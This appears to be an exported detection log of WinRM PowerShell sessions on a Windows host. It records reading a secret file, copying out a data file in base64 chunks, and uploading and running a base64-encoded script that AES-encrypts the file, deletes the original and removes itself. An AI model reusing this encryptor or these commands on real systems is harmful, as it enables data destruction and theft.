"2025-12-05T16:00:43.747+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-12-05T16:00:44.442+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_goitmr21.02m.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_goitmr21.02m.ps1","null
null"
"2025-12-05T16:00:45.284+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","(get-location).path
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
(get-location).path
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-05T16:01:38.280+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cat secret.txt

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cat secret.txt

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-05T16:02:37.584+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cd ../../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd ../../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-05T16:02:39.693+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cd ../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd ../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-05T16:02:50.161+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cd 'Program Files
'
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd 'Program Files
'
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-05T16:02:54.085+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cd 'Program Files'
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd 'Program Files'
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-05T16:03:25.965+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","(get-item 'C:\Program Files\data_important.txt').length
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
(get-item 'C:\Program Files\data_important.txt').length
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-05T16:03:26.015+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-12-05T16:03:26.131+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_ynyprjst.nib.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_ynyprjst.nib.ps1","null
null"
"2025-12-05T16:03:26.457+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$p = $ExecutionContext.SessionState.Path
$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt"")
$index = 0
$chunkSize = 1048576
if (Test-Path $path -PathType Leaf) {
  $file = [System.IO.File]::OpenRead($path)
  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
  $chunk = New-Object byte[] $chunkSize
  $bytesRead = $file.Read($chunk, 0, $chunkSize)
  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
  Write-Host $bytes
  exit 0
}
ElseIf (Test-Path $path -PathType Container) {
  exit 2
}
exit 1

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$p = $ExecutionContext.SessionState.Path
$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt"")
$index = 0
$chunkSize = 1048576
if (Test-Path $path -PathType Leaf) {
  $file = [System.IO.File]::OpenRead($path)
  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
  $chunk = New-Object byte[] $chunkSize
  $bytesRead = $file.Read($chunk, 0, $chunkSize)
  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
  Write-Host $bytes
  exit 0
}
ElseIf (Test-Path $path -PathType Container) {
  exit 2
}
exit 1

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-05T16:03:26.634+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-12-05T16:03:26.749+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_xdrmrsan.5rp.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_xdrmrsan.5rp.ps1","null
null"
"2025-12-05T16:03:27.033+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$p = $ExecutionContext.SessionState.Path
$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt"")
$index = 37
$chunkSize = 1048576
if (Test-Path $path -PathType Leaf) {
  $file = [System.IO.File]::OpenRead($path)
  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
  $chunk = New-Object byte[] $chunkSize
  $bytesRead = $file.Read($chunk, 0, $chunkSize)
  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
  Write-Host $bytes
  exit 0
}
ElseIf (Test-Path $path -PathType Container) {
  exit 2
}
exit 1

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$p = $ExecutionContext.SessionState.Path
$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt"")
$index = 37
$chunkSize = 1048576
if (Test-Path $path -PathType Leaf) {
  $file = [System.IO.File]::OpenRead($path)
  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
  $chunk = New-Object byte[] $chunkSize
  $bytesRead = $file.Read($chunk, 0, $chunkSize)
  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
  Write-Host $bytes
  exit 0
}
ElseIf (Test-Path $path -PathType Container) {
  exit 2
}
exit 1

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-05T16:03:27.225+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-05T16:03:49.955+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-12-05T16:03:50.079+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_yhihkbmn.3hv.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_yhihkbmn.3hv.ps1","null
null"
"2025-12-05T16:03:50.371+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$hash_file = @{
  ""e270daecb216ec6241a2fa0e4b1c3ab3076b83e4"" = @{
    ""target"" = ""C:\Program Files\encrypt.ps1"";
    ""src_basename"" = ""encrypt.ps1"";
    ""dst"" = ""C:\Program Files\encrypt.ps1""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$hash_file = @{
  ""e270daecb216ec6241a2fa0e4b1c3ab3076b83e4"" = @{
    ""target"" = ""C:\Program Files\encrypt.ps1"";
    ""src_basename"" = ""encrypt.ps1"";
    ""dst"" = ""C:\Program Files\encrypt.ps1""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-05T16:03:50.378+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}
Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}"
"2025-12-05T16:03:50.420+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","{
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  }
{
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  }"
"2025-12-05T16:03:50.427+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}
Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}"
"2025-12-05T16:03:50.555+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt.ps1"")
            $parent = Split-Path $to
            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
                $to,
                [system.io.filemode]::Create,
                [System.io.FileAccess]::Write,
                [System.IO.FileShare]::ReadWrite
            )
            # Powershell caches ScrpitBlocks in a dictionary
            # keyed on the script block text. Thats just great
            # unless the script is super large and called a gillion
            # times like we might do. In such a case it will saturate the
            # Large Object Heap and lead to Out Of Memory exceptions
            # for large files or folders. So we call the internal method
            # ClearScriptBlockCache to clear it.
            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt.ps1"")
            $parent = Split-Path $to
            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
                $to,
                [system.io.filemode]::Create,
                [System.io.FileAccess]::Write,
                [System.IO.FileShare]::ReadWrite
            )
            # Powershell caches ScrpitBlocks in a dictionary
            # keyed on the script block text. Thats just great
            # unless the script is super large and called a gillion
            # times like we might do. In such a case it will saturate the
            # Large Object Heap and lead to Out Of Memory exceptions
            # for large files or folders. So we call the internal method
            # ClearScriptBlockCache to clear it.
            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-05T16:03:50.566+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Program Files\encrypt.ps1
C:\Program Files\encrypt.ps1","null
null"
"2025-12-05T16:03:50.669+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","            if($method) { $method.Invoke($Null, $Null) }
            $bytes=[Convert]::FromBase64String('CnBhcmFtICgKCiAgICBbc3RyaW5nXSRQYXRoID0gIkM6XFByb2dyYW0gRmlsZXNcZGF0YV9pbXBvcnRhbnQudHh0IiwKCiAgICBbc3RyaW5nXSRLZXlCYXNlNjQgPSAieElzOXpBK1UxajIvcVc0YjVyNnQ3eTh1OWkwbzFwMmEzczRkNWY2ZzdoOD0iLCAKCiAgICBbc3RyaW5nXSRJVkJhc2U2NCAgPSAiMWEyYjNjNGQ1ZTZmN2c4aDlpMGoxaz09IgoKKQoKCgp0cnkgewoKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7IHRocm93ICJUYXJnZXQgbWlzc2luZyIgfQoKCgogICAgJEFlcyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkFlc106OkNyZWF0ZSgpCgogICAgJEFlcy5Nb2RlID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQ2lwaGVyTW9kZV06OkNCQwoKICAgICRBZXMuUGFkZGluZyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlBhZGRpbmdNb2RlXTo6UEtDUzcKCiAgICAkQWVzLktleSA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJEtleUJhc2U2NCkKCiAgICAkQWVzLklWICA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJElWQmFzZTY0KQoKCgogICAgJEJ5dGVzID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRQYXRoKQoKCgogICAgJEVuY3J5cHRvciA9ICRBZXMuQ3JlYXRlRW5jcnlwdG9yKCkKCiAgICAkRW5jcnlwdGVkQnl0ZXMgPSAkRW5jcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soJEJ5dGVzLCAwLCAkQnl0ZXMuTGVuZ3RoKQoKCgogICAgJERlc3RGaWxlID0gJFBhdGggKyAiLmFlcyIKCiAgICBbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCREZXN0RmlsZSwgJEVuY3J5cHRlZEJ5dGVzKQoKCgogICAgUmVtb3ZlLUl0ZW0gLVBhdGggJFBhdGggLUZvcmNlCgogICAgV3JpdGUtSG9zdCAiWytdIEZpbGUgRW5jcnlwdGVkOiAkRGVzdEZpbGUiCgogICAgCgp9CgpjYXRjaCB7IFdyaXRlLUVycm9yICRfIH0KCmZpbmFsbHkgewoKICAgIFJlbW92ZS1JdGVtIC1QYXRoICRNeUludm9jYXRpb24uTXlDb21tYW5kLlBhdGggLUZvcmNlCgp9Cg==')
            $fileStream.Write($bytes, 0, $bytes.length)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
            if($method) { $method.Invoke($Null, $Null) }
            $bytes=[Convert]::FromBase64String('CnBhcmFtICgKCiAgICBbc3RyaW5nXSRQYXRoID0gIkM6XFByb2dyYW0gRmlsZXNcZGF0YV9pbXBvcnRhbnQudHh0IiwKCiAgICBbc3RyaW5nXSRLZXlCYXNlNjQgPSAieElzOXpBK1UxajIvcVc0YjVyNnQ3eTh1OWkwbzFwMmEzczRkNWY2ZzdoOD0iLCAKCiAgICBbc3RyaW5nXSRJVkJhc2U2NCAgPSAiMWEyYjNjNGQ1ZTZmN2c4aDlpMGoxaz09IgoKKQoKCgp0cnkgewoKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7IHRocm93ICJUYXJnZXQgbWlzc2luZyIgfQoKCgogICAgJEFlcyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkFlc106OkNyZWF0ZSgpCgogICAgJEFlcy5Nb2RlID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQ2lwaGVyTW9kZV06OkNCQwoKICAgICRBZXMuUGFkZGluZyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlBhZGRpbmdNb2RlXTo6UEtDUzcKCiAgICAkQWVzLktleSA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJEtleUJhc2U2NCkKCiAgICAkQWVzLklWICA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJElWQmFzZTY0KQoKCgogICAgJEJ5dGVzID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRQYXRoKQoKCgogICAgJEVuY3J5cHRvciA9ICRBZXMuQ3JlYXRlRW5jcnlwdG9yKCkKCiAgICAkRW5jcnlwdGVkQnl0ZXMgPSAkRW5jcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soJEJ5dGVzLCAwLCAkQnl0ZXMuTGVuZ3RoKQoKCgogICAgJERlc3RGaWxlID0gJFBhdGggKyAiLmFlcyIKCiAgICBbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCREZXN0RmlsZSwgJEVuY3J5cHRlZEJ5dGVzKQoKCgogICAgUmVtb3ZlLUl0ZW0gLVBhdGggJFBhdGggLUZvcmNlCgogICAgV3JpdGUtSG9zdCAiWytdIEZpbGUgRW5jcnlwdGVkOiAkRGVzdEZpbGUiCgogICAgCgp9CgpjYXRjaCB7IFdyaXRlLUVycm9yICRfIH0KCmZpbmFsbHkgewoKICAgIFJlbW92ZS1JdGVtIC1QYXRoICRNeUludm9jYXRpb24uTXlDb21tYW5kLlBhdGggLUZvcmNlCgp9Cg==')
            $fileStream.Write($bytes, 0, $bytes.length)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-05T16:03:50.748+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$fileStream.Dispose()
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$fileStream.Dispose()
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-05T16:04:17.938+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","powershell -ExecutionPolicy Bypass -File .\encrypt.ps1
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
powershell -ExecutionPolicy Bypass -File .\encrypt.ps1
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-05T16:07:56.114+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","exit
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
exit
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
